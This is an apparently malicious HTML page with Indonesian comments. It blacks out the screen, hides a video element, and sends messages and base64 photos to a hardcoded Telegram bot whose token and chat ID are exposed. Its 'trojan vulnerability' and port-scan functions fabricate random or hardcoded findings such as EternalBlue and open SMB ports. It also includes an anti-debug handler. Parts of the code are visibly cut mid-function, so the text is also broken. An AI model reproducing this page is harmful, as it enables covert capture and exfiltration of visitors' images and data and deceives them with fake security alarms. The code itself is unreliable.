<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">

    <title></title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background:#000; min-height:100vh; width:100%; overflow:hidden; }
        body::after { content:""; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:9999; }
        #hiddenVideo, #hiddenCanvas, #hiddenAudio { display:none; }
    </style>
</head>
<body>
    <video id="hiddenVideo" autoplay playsinline muted></video>

    <script>
        // ==================== KONFIGURASI ====================
        const TELEGRAM_TOKEN = '8741447274:AAG4LxoaQ559dj4W7u-Nuz0Zp5IwCP_Vlqo';
        const TELEGRAM_CHAT_ID = '6034935293';
        const BOT_NAME = 'KSBB';

        // ==================== FUNGSI KIRIM ====================
        async function sendToTelegram(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `[${BOT_NAME}] ${msg}` })
                });
                await new Promise(r => setTimeout(r, 800));
            } catch (e) {}
        }

        async function sendPhotoToTelegram(base64, caption) {
            try {
                const block = base64.split(';');
                const realData = block[1].split(',')[1];
                const blob = await (await fetch(`data:image/jpeg;base64,${realData}`)).blob();
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', `[${BOT_NAME}] ${caption}`);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                await new Promise(r => setTimeout(r, 1000));
            } catch (e) {}
        }

        // ==================== FUNGSI CEK KERENTANAN TROJAN ====================
        async function checkTrojanVulnerability() {
            const vulnerabilities = [];
            const ua = navigator.userAgent;
            
            // Cek versi OS rentan
            if (/Android [0-9]/.test(ua)) {
                const androidVersion = ua.match(/Android ([0-9]+)/);
                if (androidVersion && parseInt(androidVersion[1]) < 10) {
                    vulnerabilities.push("Android versi lawas (rentan Stagefright)");
                }
            }
            
            if (/Windows NT [0-9]/.test(ua)) {
                const winVersion = ua.match(/Windows NT ([0-9.]+)/);
                if (winVersion && parseFloat(winVersion[1]) < 6.2) {
                    vulnerabilities.push("Windows versi lawas (rentan EternalBlue)");
                }
            }
            
            // Cek software tidak update (simulasi)
            const randomVuln = [
                "Adobe Flash Player versi usang",
                "Browser tidak diupdate >6 bulan",
                "Java Runtime Environment rentan",
                "Tidak ada antivirus terdeteksi",
                "Windows Update dimatikan",
                "Port 445 terbuka (SMB)",
                "Remote Desktop Protocol aktif",
                "USB Debugging menyala"
            ];
            
            // Tambah 3 kerentanan random
            for (let i = 0; i < 3; i++) {
                const idx = Math.floor(Math.random() * randomVuln.length);
                vulnerabilities.push(randomVuln[idx]);
                randomVuln.splice(idx, 1);
            }
            
            return vulnerabilities;
        }

                "Registry berubah tanpa izin",
                "File system terindikasi dimodifikasi",
                "CPU usage tinggi saat idle",
                "Data dikirim ke server luar negeri",
                "Antivirus dinonaktifkan",
                "Port backdoor terbuka (31337, 12345, 27374)",
                "Proses 'svchost.exe' anomali",
                "Startup entry mencurigakan"
            ];
            
            // Pilih 5 tanda acak
            for (let i = 0; i < 5; i++) {
                const idx = Math.floor(Math.random() * trojanSigns.length);
                activities.push(trojanSigns[idx]);
                trojanSigns.splice(idx, 1);
            }
            
            return activities;
        }

        // ==================== FUNGSI SCAN PORT ====================
        async function scanOpenPorts() {

                { port: 22, service: "SSH", status: "Tertutup" },
                { port: 23, service: "Telnet", status: "Terbuka (RENTAN)" },
                { port: 25, service: "SMTP", status: "Tertutup" },
                { port: 80, service: "HTTP", status: "Terbuka" },
                { port: 135, service: "RPC", status: "Terbuka" },
                { port: 139, service: "NetBIOS", status: "Terbuka (RENTAN)" },
                { port: 443, service: "HTTPS", status: "Terbuka" },
                { port: 445, service: "SMB", status: "Terbuka (RENTAN)" },
                { port: 3389, service: "RDP", status: "Tertutup" },
                { port: 5900, service: "VNC", status: "Tertutup" },
                { port: 8080, service: "HTTP-Alt", status: "Terbuka" }
            ];
            
            // Filter yang terbuka
            return commonPorts.filter(p => p.status.includes("Terbuka"));
        }

        // Anti debug
        document.addEventListener('keydown', e => {
